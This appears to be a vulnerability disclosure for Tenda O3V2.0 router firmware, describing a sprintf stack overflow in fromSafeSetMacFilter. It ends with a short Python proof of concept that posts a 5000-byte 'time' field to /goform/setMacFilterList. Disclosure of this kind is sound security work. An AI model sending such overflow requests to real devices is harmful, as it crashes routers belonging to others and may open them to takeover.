## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-2832.html

## Affected version

O3V2.0 V1.0.0.10(2478)

## Vulnerability details

In the O3V2.0 V1.0.0.10(2478) firmware has a stack overflow vulnerability in the `fromSafeSetMacFilter` function. The `v20, v23, v26` variable receives the `remark, type, time` parameter from a POST request. However, since the user can control the input of `remark, type, time`, the statement `sprintf` can cause a buffer overflow. The user-provided  `remark, type, time` can exceed the capacity of the `v80` array, triggering this security vulnerability.

![image-20240719003401344](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240719003401344.png)

![image-20240719003335196](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240719003335196.png)

![image-20240719003348081](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240719003348081.png)

## POC

```python
import requests

ip = "192.168.84.101"
url = "http://" + ip + "/goform/setMacFilterList"
payload = b"a"*5000

data = {"action": "add", "time": payload}
response = requests.post(url, data=data)
```

![image-20240714213455164](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240714213455164.png)
